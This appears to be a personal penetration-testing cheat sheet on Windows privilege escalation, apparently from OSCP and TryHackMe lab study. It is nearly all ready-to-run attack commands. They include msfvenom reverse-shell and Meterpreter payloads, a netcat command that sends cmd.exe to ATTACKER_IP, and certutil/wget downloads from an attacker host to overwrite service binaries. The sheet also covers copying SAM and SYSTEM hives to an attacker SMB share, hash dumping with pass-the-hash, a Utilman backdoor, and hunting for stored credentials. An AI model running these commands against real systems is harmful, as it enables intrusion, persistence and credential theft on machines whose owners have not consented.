
other guides to check out:
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://fuzzysecurity.com/tutorials/16.html
More links: https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources

can use iron corp to test win stuff

if webshell
	get info on current dir `cd`
	go to and list contents of a dir `cd C:\Windows\Microsoft.NET\Framework\ && dir`

First checks
	List environment
		cmd: `set`
		ps: `Get-ChildItem env: | Format-Table -Wrap`
	Information
		cmd: `ver`
		cmd: `systeminfo`
		ps: Get-SystemInfo
		cmd: `tasklist`
		ps: `Get-LocalUser`
	Networking
		cmd: `ipconfig /all`
		ps: `Get-NetIPConfiguration`
		ps: `Get-NetIPAddress`
		cmd: `netstat`
		ps: `Get-NetTCPConnection`
	whatever

whoami /all

net user - list local users
net user username
net user administrator
net localgroup
net localgroup administrators

ipconfig /all
dns might be domain server

arp -a
are there other computer but us and the dns?

route print

netstat -ano
what are we listening on, did we see all in nmap

--

manual password hunting
`findstr /ai password *.txt *.ini *.config*` does a recursive search in files
also search for uid, pwd and auth

av & fw
`sc` - service controll
`sc query windefend`
`sc queryex type=service`
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config


wmic
	`wmic qfe` quick fix engineering - list hotfixes/patches
	`wmic logicaldisc` - list drives


Remember
`dir /a` Displays hidden and system files as well.
`dir /s` Displays files in the current directory and all subdirectories.

Check for credentials left from unattended installation:
	`C:\Unattend.xml`
	`C:\Windows\Panther\Unattend.xml`
	`C:\Windows\Panther\Unattend\Unattend.xml`
	`C:\Windows\system32\sysprep.inf`
	`C:\Windows\system32\sysprep\sysprep.xml`
	File format: [[unattended installation credential files]]

Powershell history
	cmd: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
	ps: `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

Other interesting files
	`\windows\win.ini`
	`\windows\system32\config\sam`

Saved credentials
	cmd/ps: `cmdkey /list` no passwords, but can be used with `runas /savecred /user:admin cmd.exe`

Credential files
	Firefox
		https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts.html?highlight=firefox#firefox
		`%userprofile%\AppData\Roaming\Mozilla\Firefox\Profiles\`
	Chrome...

Configuration files
	find strings in logfiles
		cmd/ps: `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
	IIS
		`C:\inetpub\wwwroot\web.config`
		`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
	Putty
		cmd/ps: `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s` proxy creds?
	Add more - software that store creds have methods to retrieve them - browsers, email-, FTP-, SSH clients, VNC software ...

Scheduled tasks
	`schtasks` list all tasks
	`schtasks /query /tn [taskname] /fo list /v` get more info on task
	`schtasks /run /tn [taskname]` start task (if perms)

Permissions and ownership
	`icacls .` [[icacls]]

Getting text into text files at ps/cmd-prompt
	cmd: `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`

MSI installation perms
	These reg keys needs to be set to exploit AlwaysInstallElevated:
		`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
		`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
	Generate msi:
		`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`
	Run it:
		`msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

Services
	[[services, control]]
	Get info
		ps: `Get-Service` list services
		`sc qc [service name]` get info on specific service
	Service info location in registry
		`HKLM\SYSTEM\CurrentControlSet\Services\`
	Get perms
		ps, cmd: `icacls [service executable]` executable = BINARY_PATH_NAME in sc, ImagePath in registry
		can be found by winpeas
		set perms
			ps, cmd: `icacls "C:\PROGRA~2\SYSTEM~1\WService.exe" /grant Everyone:F`
	Exploiting Modify permissions on the service exe - Generate service executable, upload, set perms
		atk: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`
		atk: share the file (`python3 -m http.server 8000`)
		ps: `Stop-Service -Name WindowsScheduler -Force`
		cmd: `net stop WindowsScheduler`
		ps: `wget "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" -O "C:\PROGRA~2\SYSTEM~1\WService.exe"`
		cmd: `certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" "C:\PROGRA~2\SYSTEM~1\WService.exe"`
		atk: start a listener (`nc -lvnp 443`)
		ps: `Start-Service -Name "SERVICE-NAME"`
		cmd: `net start "SERVICE-NAME"`
	Exploiting Unquoted Service Paths
		Execution order of unquoted path: `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
			1. `C:\MyPrograms\Disk.exe`
			2. `C:\MyPrograms\Disk Sorter.exe`
			3. `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
		atk: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`
		atk: share the file (`python3 -m http.server 8000`)
		ps: `wget "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" -O "C:\MyPrograms\Disk.exe"`
		cmd: `certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" "C:\MyPrograms\Disk.exe"`
		ps, cmd: `icacls C:\MyPrograms\Disk.exe /grant Everyone:F`
		atk: start a listener (`nc -lvnp 443`)
		ps: `Restart-Service -Name "SERVICE-NAME" -Force`
		cmd: `net stop "SERVICE-NAME" && net start "SERVICE-NAME"`
	Exploiting Insecure Service Permissions
		ps, cmd: `sc.exe sdshow thmservice` Check service permissions [[permissions SDDL]]
		`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`
		share the file (`python3 -m http.server 8000`)
		ps: `wget "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" -O "C:\Users\thm-unpriv\rev-svc3.exe"`
		cmd: `certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" "C:\Users\thm-unpriv\rev-svc3.exe"`
		ps, cmd: `icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`
		To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
		ps:  `sc.exe config THMService binPath="C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem` to set new bin & account
		cmd: `sc config THMService binPath="C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem` to set new bin & account
		start a listener (`nc -lvnp 443`)
		ps: `Restart-Service -Name THMService -Force`
		cmd: `net stop "SERVICE-NAME" && net start THMService`

Check your current integrity level with
	`whoami /groups`
	more info https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels

Privileges
	`whoami /priv` shows only current ones, not the admin mode ones (like being in the backup group ones)
	`whoami /all` to see groups too as we probably have to open cmd as admin to get all privileges
	[Complete list of privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
	Find ways to exploit: [here](https://github.com/gtworek/Priv2Admin)
	If `SeBackupPriviledge` we can read any file
		`reg save hklm\system C:\Users\THMBackup\system.hive`
		`reg save hklm\sam C:\Users\THMBackup\sam.hive`
		atk: `sudo impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 myshare ../dirname`
		`copy sam.hive \\10.18.21.236\myshare`
		`copy system.hive \\10.18.21.236\myshare`
		atk: `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
		atk: `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.62.147`
	if `SeTakeOwnershipPrivilege` we can take ownership of any object on the system, including files and registry keys
		`takeown /f C:\Windows\System32\Utilman.exe`
		`icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
		`copy cmd.exe utilman.exe`
		Lock the console and press `Win+U`
	if `SeImpersonate` or `SeAssignPrimaryToken`
		Account with these privs: `LOCAL SERVICE`, `NETWORK SERVICE ACCOUNTS`, `iis apppool\defaultapppool`, others?
		Exploit this by:
			1. spawn a process with ^ that users can connect and authenticate to
			2. force privileged users to connect and authenticate
	https://www.exploit-db.com/papers/42556
	SeTcbPrivilege
	SeRestorePrivilege
	SeCreateTokenPrivilege
	SeLoadDriverPrivilege
	SeDebugPrivilege
	play with these on thm alfred


Installed/unpatched software
	`wmic product get name,version,vendor` enum programs - also check desktop shortcuts, start menu, available services...
	look for exploits for the apps
	Druva inSync 6.6.3 - example https://www.exploit-db.com/exploits/49211

HotFixes
	`wmic qfe get Caption,Description,HotFixID,InstalledOn`

List drive letters
	`(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)`

Metasploit
	go from nc shell to msf
		make msfvenom payload
			`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.21.236 LPORT=444 -f exe -o revsh-meterpr-444.exe`
		from the box - copy to box
			`certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" "C:\windows\temp\revsh-meterpr-444.exe"`
		start metasploit listener on attacker machine
			`msfconsole -q`
				`use exploit/multi/handler`
				`set payload windows/meterpreter/reverse_tcp`
				`set lhost 10.18.21.236`
				`set lport 444`
				`options` check that it's all correct
				`run` will start listening
		from the box - start revsh
			`C:\windows\temp\revsh-meterpr-444.exe`
	if connected
		`multi/recon/local_exploit_suggester`

Tools
	WinPEAS
		start kali python http server `python3 -m http.server 8000`
		 https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS exe, bat & ps1 versions
		cmd: `certutil -urlcache -split -f http://10.21.31.111:8000/enum/winPEASany.exe C:\windows\temp\winpeas.exe`
		ps: `iwr "http://10.18.21.236:8000/enum/winPEASany.exe" -outfile "C:\windows\temp\winpeas.exe"`
		`winpeas > log.txt`
	PrivescCheck
		https://github.com/itm4n/PrivescCheck
		Bypass execution policy restrictions before running:
			`Set-ExecutionPolicy Bypass -Scope process -Force`
			`. .\PrivescCheck.ps1`
			`Invoke-PrivescCheck`
		Basic check
			`powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
		Extended checks + human-readable reports
			`powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"`
		All checks + all reports
			`powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"`
	WES-NG
		https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
		runs on attacker box
		install, run "wes.py --update" to upd database
		run `systeminfo > info.txt` on windows box
		run `wes.py info.txt` on attacker box

